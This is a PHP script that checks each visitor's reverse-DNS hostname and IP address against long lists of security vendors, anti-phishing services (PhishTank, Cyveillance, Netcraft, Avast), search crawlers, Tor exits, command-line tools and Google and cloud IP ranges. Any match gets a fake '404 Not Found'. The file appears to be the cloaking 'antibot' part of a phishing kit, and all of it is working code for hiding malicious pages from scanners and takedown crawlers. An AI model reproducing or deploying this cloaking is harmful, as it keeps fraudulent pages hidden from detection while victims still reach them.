<?php

$hostname = gethostbyaddr($_SERVER['REMOTE_ADDR']);

$blocked_words = array( 
                        "above",
                        "google",
                        "softlayer",
                        "amazonaws",
                        "cyveillance",
                        "phishtank",
                        "dreamhost",
                        "netpilot",
                        "calyxinstitute",
                        "tor-exit",
                        "netsparker",
                        "007ac9",
                        "008",
                        "192.comagent",
                        "200pleasebot",
                        "360spider",
                        "4seohuntbot",
                        "avast",
                        "avira",
                        "50.nu",
                        "a6-indexer",
                        "admantx",
                        "amznkassocbot",
                        "aboundexbot",
                        "aboutusbot",
                        "abrave spider",
                        "accelobot",
                        "acoonbot",
                        "addthis.com",
                        "adsbot-google",
                        "ahrefsbot",
                        "alexabot",
                        "amagit.com",
                        "analytics",
                        "antbot",
                        "apercite",
                        "aportworm",
                        "arabot",
                        "yahoo",
                        "Googlebot", 
                        "Baiduspider", 
                        "ia_archiver",
                        "R6_FeedFetcher", 
                        "NetcraftSurveyAgent", 
                        "Sogou web spider",
                        "bingbot", 
                        "Yahoo! Slurp", 
                        "facebookexternalhit", 
                        "PrintfulBot",
                        "msnbot", 
                        "Twitterbot", 
                        "UnwindFetchor", 
                        "urlresolver", 
                        "Butterfly", 
                        "TweetmemeBot",
                        "PaperLiBot",
                        "MJ12bot",
                        "AhrefsBot",
                        "Exabot",
                        "Ezooms",
                        "YandexBot",
                        "SearchmetricsBot",
                        "picsearch",
                        "TweetedTimes Bot",
                        "QuerySeekerSpider",
                        "ShowyouBot",
                        "woriobot",
                        "merlinkbot",
                        "BazQuxBot",
                        "Kraken",
                        "SISTRIX Crawler",
                        "R6_CommentReader",
                        "magpie-crawler",
                        "GrapeshotCrawler",
                        "PercolateCrawler",
                        "MaxPointCrawler",
                        "R6_FeedFetcher",
                        "NetSeer crawler",
                        "grokkit-crawler",
                        "SMXCrawler",
                        "PulseCrawler",
                        "Y!J-BRW",
                        "80legs.com/webcrawler",
                        "Mediapartners-Google", 
                        "Spinn3r", 
                        "InAGist", 
                        "Python-urllib", 
                        "NING", 
                        "TencentTraveler",
                        "Feedfetcher-Google", 
                        "mon.itor.us", 
                        "spbot", 
                        "Feedly",
                        "bot",
                        "curl",
                        "spider",
                        "crawler",
                        "abot",
                        "dbot",
                        "ebot",
                        "hbot",
                        "kbot",
                        "lbot",
                        "mbot",
                        "nbot",
                        "obot",
                        "pbot",
                        "rbot",
                        "sbot",
                        "tbot",
                        "vbot",
                        "ybot",
                        "zbot",
                        "bot.",
                        "bot/",
                        "_bot",
                        ".bot",
                        "/bot",
                        "-bot",
                        ":bot",
                        "(bot",
                        "crawl",
                        "slurp",
                        "spider",
                        "seek",
                        "accoona",
                        "acoon",
                        "adressendeutschland",
                        "ah-ha.com",
                        "ahoy",
                        "altavista",
                        "ananzi",
                        "anthill",
                        "appie",
                        "arachnophilia",
                        "arale",
                        "araneo",
                        "aranha",
                        "architext",
                        "aretha",
                        "arks",
                        "asterias",
                        "atlocal",
                        "atn",
                        "atomz",
                        "augurfind",
                        "backrub",
                        "bannana_bot",
                        "baypup",
                        "bdfetch",
                        "big brother",
                        "biglotron",
                        "bjaaland",
                        "blackwidow",
                        "blaiz",
                        "blog",
                        "blo.",
                        "bloodhound",
                        "boitho",
                        "booch",
                        "bradley",
                        "butterfly",
                        "calif",
                        "cassandra",
                        "ccubee",
                        "cfetch",
                        "charlotte",
                        "churl",
                        "cienciaficcion",
                        "cmc",
                        "collective",
                        "comagent",
                        "combine",
                        "computingsite",
                        "csci",
                        "curl",
                        "cusco",
                        "daumoa",
                        "deepindex",
                        "delorie",
                        "depspid",
                        "deweb",
                        "echo blinde kuh",
                        "digger",
                        "ditto",
                        "dmoz",
                        "docomo",
                        "download express",
                        "dtaagent",
                        "dwcp",
                        "ebiness",
                        "ebingbong",
                        "e-collector",
                        "ejupiter",
                        "emacs-w3 search engine",
                        "esther",
                        "evliya celebi",
                        "ezresult",
                        "falcon",
                        "felix ide",
                        "ferret",
                        "fetchrover",
                        "fido",
                        "findlinks",
                        "fireball",
                        "fish search",
                        "fouineur",
                        "funnelweb",
                        "gazz",
                        "gcreep",
                        "genieknows",
                        "getterroboplus",
                        "geturl",
                        "glx",
                        "goforit",
                        "golem",
                        "grabber",
                        "grapnel",
                        "gralon",
                        "griffon",
                        "gromit",
                        "grub",
                        "gulliver",
                        "hamahakki",
                        "harvest",
                        "havindex",
                        "helix",
                        "heritrix",
                        "hku www octopus",
                        "homerweb",
                        "htdig",
                        "html index",
                        "html_analyzer",
                        "htmlgobble",
                        "hubater",
                        "hyper-decontextualizer",
                        "ia_archiver",
                        "ibm_planetwide",
                        "ichiro",
                        "iconsurf",
                        "iltrovatore",
                        "image.kapsi.net",
                        "imagelock",
                        "incywincy",
                        "indexer",
                        "infobee",
                        "informant",
                        "ingrid",
                        "inktomisearch.com",
                        "inspector web",
                        "intelliagent",
                        "internet shinchakubin",
                        "ip3000",
                        "iron33",
                        "israeli-search",
                        "ivia",
                        "jack",
                        "jakarta",
                        "javabee",
                        "jetbot",
                        "jumpstation",
                        "katipo",
                        "kdd-explorer",
                        "kilroy",
                        "knowledge",
                        "kototoi",
                        "kretrieve",
                        "labelgrabber",
                        "lachesis",
                        "larbin",
                        "legs",
                        "libwww",
                        "linkalarm",
                        "link validator",
                        "linkscan",
                        "lockon",
                        "lwp",
                        "lycos",
                        "magpie",
                        "mantraagent",
                        "mapoftheinternet",
                        "marvin/",
                        "mattie",
                        "mediafox",
                        "mediapartners",
                        "mercator",
                        "merzscope",
                        "microsoft url control",
                        "minirank",
                        "miva",
                        "mj12",
                        "mnogosearch",
                        "moget",
                        "monster",
                        "moose",
                        "motor",
                        "multitext",
                        "muncher",
                        "muscatferret",
                        "mwd.search",
                        "myweb",
                        "najdi",
                        "nameprotect",
                        "nationaldirectory",
                        "nazilla",
                        "ncsa beta",
                        "nec-meshexplorer",
                        "nederland.zoek",
                        "netcarta webmap engine",
                        "netmechanic",
                        "netresearchserver",
                        "netscoop",
                        "newscan-online",
                        "nhse",
                        "nokia6682/",
                        "nomad",
                        "noyona",
                        "nutch",
                        "nzexplorer",
                        "objectssearch",
                        "occam",
                        "omni",
                        "open text",
                        "openfind",
                        "openintelligencedata",
                        "orb search",
                        "osis-project",
                        "pack rat",
                        "pageboy",
                        "pagebull",
                        "page_verifier",
                        "panscient",
                        "parasite",
                        "partnersite",
                        "patric",
                        "pear.",
                        "pegasus",
                        "peregrinator",
                        "pgp key agent",
                        "phantom",
                        "phpdig",
                        "picosearch",
                        "piltdownman",
                        "pimptrain",
                        "pinpoint",
                        "pioneer",
                        "piranha",
                        "plumtreewebaccessor",
                        "pogodak",
                        "poirot",
                        "pompos",
                        "poppelsdorf",
                        "poppi",
                        "popular iconoclast",
                        "psycheclone",
                        "publisher",
                        "python",
                        "rambler",
                        "raven search",
                        "roach",
                        "road runner",
                        "roadhouse",
                        "robbie",
                        "robofox",
                        "robozilla",
                        "rules",
                        "salty",
                        "sbider",
                        "scooter",
                        "scoutjet",
                        "scrubby",
                        "search.",
                        "searchprocess",
                        "semanticdiscovery",
                        "senrigan",
                        "sg-scout",
                        "shai'hulud",
                        "shark",
                        "shopwiki",
                        "sidewinder",
                        "sift",
                        "silk",
                        "simmany",
                        "site searcher",
                        "site valet",
                        "sitetech-rover",
                        "skymob.com",
                        "sleek",
                        "smartwit",
                        "sna-",
                        "snappy",
                        "snooper",
                        "sohu",
                        "speedfind",
                        "sphere",
                        "sphider",
                        "spinner",
                        "spyder",
                        "steeler/",
                        "suke",
                        "suntek",
                        "supersnooper",
                        "surfnomore",
                        "sven",
                        "sygol",
                        "szukacz",
                        "tach black widow",
                        "tarantula",
                        "templeton",
                        "/teoma",
                        "t-h-u-n-d-e-r-s-t-o-n-e",
                        "theophrastus",
                        "titan",
                        "titin",
                        "tkwww",
                        "toutatis",
                        "t-rex",
                        "tutorgig",
                        "twiceler",
                        "twisted",
                        "ucsd",
                        "udmsearch",
                        "url check",
                        "updated",
                        "vagabondo",
                        "valkyrie",
                        "verticrawl",
                        "victoria",
                        "vision-search",
                        "volcano",
                        "voyager/",
                        "voyager-hc",
                        "w3c_validator",
                        "w3m2",
                        "w3mir",
                        "walker",
                        "wallpaper",
                        "wanderer",
                        "wauuu",
                        "wavefire",
                        "web core",
                        "web hopper",
                        "web wombat",
                        "webbandit",
                        "webcatcher",
                        "webcopy",
                        "webfoot",
                        "weblayers",
                        "weblinker",
                        "weblog monitor",
                        "webmirror",
                        "webmonkey",
                        "webquest",
                        "webreaper",
                        "websitepulse",
                        "websnarf",
                        "webstolperer",
                        "webvac",
                        "webwalk",
                        "webwatch",
                        "webwombat",
                        "webzinger",
                        "wget",
                        "whizbang",
                        "whowhere",
                        "wild ferret",
                        "worldlight",
                        "wwwc",
                        "wwwster",
                        "xenu",
                        "xget",
                        "xift",
                        "xirq",
                        "yandex",
                        "yanga",
                        "yeti",
                        "yodao",
                        "zao/",
                        "zippp",
                        "zyborg"
                );

        
foreach($blocked_words as $word) {
    if (substr_count($hostname, $word) > 0) {
        header("HTTP/1.0 404 Not Found");
        die("<h1>404 Not Found</h1>The page that you have requested could not be found.");
    }  
}


$bannedIP = array(
                        "108.177.7.*",
                        "^108.177.8.*",
                        "^108.177.9.*",
                        "^108.177.10.*",
                        "^108.177.11.*",
                        "^108.177.12.*",
                        "^108.177.13.*",
                        "^108.177.14.*",
                        "^108.177.15.*",
                        "^108.177.96.*",
                        "^108.177.97.*",
                        "^108.177.98.*",
                        "^108.177.99.*",
                        "^108.177.100.*",
                        "^108.177.101.*",
                        "^108.177.102.*",
                        "^108.177.103.*",
                        "^108.177.104.*",
                        "^108.177.105.*",
                        "^108.177.106.*",
                        "^108.177.107.*",
                        "^108.177.108.*",
                        "^108.177.109.*",
                        "^108.177.110.*",
                        "^108.177.111.*",
                        "^108.177.112.*",
                        "^108.177.113.*",
                        "^108.177.114.*",
                        "^108.177.115.*",
                        "^108.177.116.*",
                        "^108.177.117.*",
                        "^108.177.118.*",
                        "^108.177.119.*",
                        "^108.177.120.*",
                        "^108.177.121.*",
                        "^108.177.122.*",
                        "^108.177.123.*",
                        "^108.177.124.*",
                        "^108.177.125.*",
                        "^108.177.126.*",
                        "^108.177.127.*",
                        "^81.161.59.*",
                        "^66.135.200.*",
                        "^38.100.*.*",
                        "^107.170.*.*",
                        "^149.20.*.*",
                        "^38.105.*.*",
                        "^66.150.14.*",
                        "^54.176.*.*",
                        "^38.100.*.*",
                        "^184.173.*.*",
                        "^66.249.*.*",
                        "^128.242.*.*",
                        "^72.14.192.*",
                        "^208.65.144.*",
                        "^209.85.128.*",
                        "^216.239.32.*",
                        "^74.125.*.*",
                        "^207.126.144.*",
                        "^173.194.*.*",
                        "^64.233.160.*",
                        "^72.14.192.*",
                        "^66.102.*.*",
                        "^64.18.*.*",
                        "^194.52.68.*",
                        "^194.72.238.*",
                        "^62.116.207.*",
                        "^212.50.193.*",
                        "^69.65.*.*",
                        "^50.7.*.*",
                        "^131.212.*.*",
                        "^46.116.*.* ",
                        "^62.90.*.*",
                        "^89.138.*.*",
                        "^82.166.*.*",
                        "^85.64.*.*",
                        "^85.250.*.*",
                        "^89.138.*.*",
                        "^93.172.*.*",
                        "^109.186.*.*",
                        "^194.90.*.*",
                        "^212.29.192.*",
                        "^212.29.224.*",
                        "^212.143.*.*",
                        "^212.150.*.*",
                        "^212.235.*.*",
                        "^217.132.*.*",
                        "^50.97.*.*",
                        "^217.132.*.*",
                        "^209.85.*.*",
                        "^66.205.64.*",
                        "^204.14.48.*",
                        "^64.27.2.*",
                        "^67.15.*.*",
                        "^202.108.252.*",
                        "^193.47.80.*",
                        "^64.62.136.*",
                        "^66.221.*.*",
                        "^64.62.175.*",
                        "^198.54.*.*",
                        "^192.115.134.*",
                        "^216.252.167.*",
                        "^193.253.199.*",
                        "^69.61.12.*",
                        "^64.37.103.*",
                        "^38.144.36.*",
                        "^64.124.14.*",
                        "^206.28.72.*",
                        "^209.73.228.*",
                        "^158.108.*.*",
                        "^168.188.*.*",
                        "^66.207.120.*",
                        "^167.24.*.*",
                        "^192.118.48.*",
                        "^67.209.128.*",
                        "^12.148.209.*",
                        "^12.148.196.*",
                        "^193.220.178.*",
                        "68.65.53.71",
                        "^198.25.*.*",
                        "^64.106.213.*",
                        "^91.103.66.*",
                        "^208.91.115.*",
                        "^199.30.228.*",
                        "^172.217.0.*",
                        "^172.217.1.*",
                        "^172.217.2.*",
                        "^172.217.3.*",
                        "^172.217.4.*",
                        "^172.217.5.*",
                        "^172.217.6.*",
                        "^172.217.7.*",
                        "^172.217.8.*",
                        "^172.217.9.*",
                        "^172.217.10.*",
                        "^172.217.11.*",
                        "^172.217.12.*",
                        "^172.217.13.*",
                        "^172.217.14.*",
                        "^172.217.15.*",
                        "^172.217.16.*",
                        "^172.217.17.*",
                        "^172.217.18.*",
                        "^172.217.19.*",
                        "^172.217.20.*",
                        "^172.217.21.*",
                        "^172.217.22.*",
                        "^172.217.23.*",
                        "^172.217.24.*",
                        "^172.217.25.*",
                        "^172.217.26.*",
                        "^172.217.27.*",
                        "^172.217.28.*",
                        "^172.217.29.*",
                        "^172.217.30.*",
                        "^172.217.31.*",
                        "^173.194.*.*",
                        "^207.126.144.*",
                        "^207.126.145.*",
                        "^207.126.146.*",
                        "^207.126.147.*",
                        "^207.126.148.*",
                        "^207.126.149.*",
                        "^207.126.150.*",
                        "^207.126.151.*",
                        "^207.126.152.*",
                        "^207.126.153.*",
                        "^207.126.154.*",
                        "^207.126.155.*",
                        "^207.126.156.*",
                        "^207.126.157.*",
                        "^209.85.128.*",
                        "^209.85.129.*",
                        "^209.85.130.*",
                        "^209.85.131.*",
                        "^209.85.132.*",
                        "^209.85.133.*",
                        "^209.85.134.*",
                        "^209.85.135.*",
                        "^209.85.136.*",
                        "^209.85.137.*",
                        "^209.85.138.*",
                        "^209.85.139.*",
                        "^209.85.140.*",
                        "^209.85.141.*",
                        "^209.85.142.*",
                        "^209.85.143.*",
                        "^209.85.144.*",
                        "^209.85.145.*",
                        "^209.85.146.*",
                        "^209.85.147.*",
                        "^209.85.148.*",
                        "^209.85.149.*",
                        "^209.85.149.*",
                        "^209.85.150.*",
                        "^209.85.151.*",
                        "^209.85.152.*",
                        "^209.85.153.*",
                        "^216.58.192.*",
                        "^216.58.193.*",
                        "^216.58.194.*",
                        "^216.58.195.*",
                        "^216.58.196.*",
                        "^216.58.197.*",
                        "^216.58.198.*",
                        "^216.58.199.*",
                        "^216.58.200.*",
                        "^216.58.201.*",
                        "^216.58.202.*",
                        "^216.58.203.*",
                        "^216.58.204.*",
                        "^216.58.205.*",
                        "^216.58.206.*",
                        "^216.58.207.*",
                        "^216.58.208.*",
                        "^216.58.209.*",
                        "^216.58.210.*",
                        "^216.58.211.*",
                        "^216.58.212.*",
                        "^216.58.213.*",
                        "^216.58.214.*",
                        "^216.58.215.*",
                        "^216.58.216.*",
                        "^216.58.217.*",
                        "^216.58.218.*",
                        "^216.58.219.*",
                        "^216.58.220.*",
                        "^216.58.221.*",
                        "^216.58.222.*",
                        "^216.58.223.*",
                        "^216.58.224.*",
                        "^216.58.225.*",
                        "^216.58.226.*",
                        "^216.58.227.*",
                        "^216.58.228.*",
                        "^216.58.229.*",
                        "^216.58.230.*",
                        "^216.58.231.*",
                        "^216.58.232.*",
                        "^216.58.233.*",
                        "^216.58.234.*",
                        "^216.58.235.*",
                        "^216.58.236.*",
                        "^216.58.237.*",
                        "^216.58.238.*",
                        "^216.58.239.*",
                        "^216.58.240.*",
                        "^216.58.241.*",
                        "^216.58.242.*",
                        "^216.58.243.*",
                        "^216.58.244.*",
                        "^216.58.245.*",
                        "^216.58.246.*",
                        "^216.58.247.*",
                        "^216.58.248.*",
                        "^216.58.249.*",
                        "^216.58.249.*",
                        "^216.58.250.*",
                        "^216.58.251.*",
                        "^216.58.252.*",
                        "^216.58.253.*",
                        "^216.58.254.*",
                        "^216.239.32.*",
                        "^216.239.33.*",
                        "^216.239.34.*",
                        "^216.239.35.*",
                        "^216.239.36.*",
                        "^216.239.37.*",
                        "^216.239.38.*",
                        "^216.239.39.*",
                        "^216.239.40.*",
                        "^216.239.41.*",
                        "^216.239.42.*",
                        "^216.239.43.*",
                        "^216.239.44.*",
                        "^216.239.45.*",
                        "^216.239.46.*",
                        "^216.239.47.*",
                        "^216.239.48.*",
                        "^216.239.49.*",
                        "^216.239.50.*",
                        "^216.239.51.*",
                        "^216.239.52.*",
                        "^216.239.53.*",
                        "^216.239.54.*",
                        "^216.239.55.*",
                        "^216.239.56.*",
                        "^216.239.57.*",
                        "^216.239.58.*",
                        "^216.239.59.*",
                        "^216.239.60.*",
                        "^216.239.61.*",
                        "^216.239.62.*",
                        "^216.239.63.*",
                        "182.55.3.106",
                        "176.126.132.2",
                        "31.184.194.109",
                        "47.90.102.76",
                        "212.28.237.203",
                        "81.30.221.28",
                        "62.173.145.40",
                        "95.154.81.159",
                        "177.234.153.130",
                        "173.239.208.7",
                        "40.107.246.29",
                        "62.4.11.107",
                        "194.187.249.40",
                        "177.47.27.182",
                        "177.47.27.186",
                        "119.81.128.204",
                        "204.128.81.119",
                        "173.244.36.6",
                        "115.124.115.69",
                        "194.78.234.247",
                        "45.74.18.99",
                        "162.247.74.202",
                        "223.252.214.47",
                        "61.97.251.168",
                        "165.84.230.153",
                        "185.216.140.17",
                        "198.7.62.204",
                        "218.211.168.176",
                        "106.75.50.37",
                        "196.52.43.86",
                        "150.101.196.61",
                        "84.255.224.83",
                        "52.128.58.102",
                        "94.177.230.169",
                        "169.57.26.190",
                        "47.91.255.127",
                        "88.119.142.4",
                        "185.63.254.19",
                        "66.102.6.239",
                        "107.170.228.217",
                        "12.131.145.251",
                        "58.152.9.242",
                        "41.215.126.246",
                        "91.221.199.72",
                        "173.205.33.24",
                        "195.211.23.224",
                        "66.90.65.252",
                        "181.44.254.97",
                        "60.251.61.8",
                        "64.74.215.176",
                        "31.6.58.14",
                        "8.28.16.254",
                        "165.231.121.211",
                        "199.58.86.209",
                        "188.72.4.181",
                        "203.189.136.207",
                        "188.243.213.204",
                        "66.111.57.18",
                        "222.76.204.102",
                        "5.249.150.160",
                        "103.253.*.*",
                        "104.131.*.*",
                        "104.236.*.*",
                        "107.170.*.*",
                        "128.199.*.*",
                        "138.197.*.*",
                        "138.68.*.*",
                        "139.59.*.*",
                        "146.185.*.*",
                        "159.203.*.*",
                        "159.65.*.*",
                        "159.89.*.*",
                        "162.243.*.*",
                        "163.47.*.*",
                        "165.227.*.*",
                        "167.99.*.*",
                        "174.138.*.*",
                        "178.128.*.*",
                        "178.62.*.*",
                        "185.14.*.*",
                        "188.166.*.*",
                        "188.226.*.*",
                        "192.241.*.*",
                        "192.34.*.*",
                        "192.81.*.*",
                        "198.199.*.*",
                        "198.211.*.*",
                        "198.232.*.*",
                        "204.48.*.*",
                        "206.189.*.*",
                        "206.81.*.*",
                        "207.154.*.*",
                        "208.68.*.*",
                        "209.97.*.*",
                        "37.139.*.*",
                        "45.55.*.*",
                        "46.101.*.*",
                        "5.101.*.*",
                        "67.205.*.*",
                        "67.207.*.*",
                        "72.28.*.*",
                        "80.240.*.*",
                        "82.196.*.*",
                        "95.85.*.*"
    );


if(in_array($_SERVER['REMOTE_ADDR'],$bannedIP)) {
    
    header("HTTP/1.0 404 Not Found");
    die("<h1>404 Not Found</h1>The page that you have requested could not be found.");

 } else {

  foreach($bannedIP as $ips) {
       
       //if(eregi($ip,$_SERVER['REMOTE_ADDR'])) {
        if(preg_match('/' . $ips . '/',$_SERVER['REMOTE_ADDR'])){
           header("HTTP/1.0 404 Not Found");
                die("<h1>404 Not Found</h1>The page that you have requested could not be found."); 

             } 
    } 
}


?>